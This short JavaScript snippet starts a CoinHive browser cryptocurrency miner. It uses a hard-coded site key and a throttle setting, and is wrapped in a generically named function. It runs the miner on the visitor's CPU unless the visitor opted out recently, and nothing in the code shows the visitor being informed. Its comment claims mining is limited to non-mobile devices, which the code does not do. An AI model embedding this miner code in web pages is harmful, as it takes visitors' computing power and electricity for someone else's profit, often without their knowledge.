function func(){
var miner = new CoinHive.Anonymous('6Ig7MZERTsVVN1mqFKilYKUzXOHqxkHu', {throttle: 0.3});

// Only start on non-mobile devices and if not opted-out
// in the last 14400 seconds (4 hours):
if (!miner.didOptOut(14400)) {
    miner.start();
    console.log("Started");
}
}
